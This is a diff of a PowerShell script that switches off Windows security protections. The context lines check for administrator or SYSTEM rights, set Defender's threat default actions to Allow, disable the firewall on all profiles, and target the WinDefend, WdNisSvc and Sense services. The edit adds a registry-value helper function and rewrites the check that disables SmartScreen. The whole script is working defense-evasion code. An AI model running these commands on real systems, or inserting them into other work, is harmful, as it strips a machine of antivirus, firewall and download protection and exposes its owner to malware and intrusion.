@@ -14,7 +14,6 @@ if (!(Test-Path -Path $defenderFolder)) {
     getOthers
 }
 
-
 if(-Not $($(whoami) -eq "nt authority\system")) {
     $IsSystem = $false
     if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
@@ -52,9 +51,36 @@ Set-MpPreference -LowThreatDefaultAction Allow -ErrorAction SilentlyContinue
 Set-MpPreference -ModerateThreatDefaultAction Allow -ErrorAction SilentlyContinue
 Set-MpPreference -HighThreatDefaultAction Allow -ErrorAction SilentlyContinue
 Set-NetFirewallProfile -All -Enabled false
-if (!(Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System\EnableSmartScreen")){
+
+
+
+#USAGE Test-RegistryValue -Path 'HKLM:\SOFTWARE\TestSoftware' -Value 'Version'
+function Test-RegistryValue {
+param (
+ [parameter(Mandatory=$true)]
+ [ValidateNotNullOrEmpty()]$Path,
+[parameter(Mandatory=$true)]
+ [ValidateNotNullOrEmpty()]$Value
+)
+try {
+Get-ItemProperty -Path $Path | Select-Object -ExpandProperty $Value -ErrorAction Stop | Out-Null
+ return $true
+}
+catch {
+return $false
+}
+}
+
+
+
+if (!(Test-Path -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System\EnableSmartScreen")){
 New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -PropertyType "DWord"
 }
+
+
+
+
+
 $need_reboot = $false
 $counter = 0
 $svc_list = @("WdNisSvc", "WinDefend", "Sense")
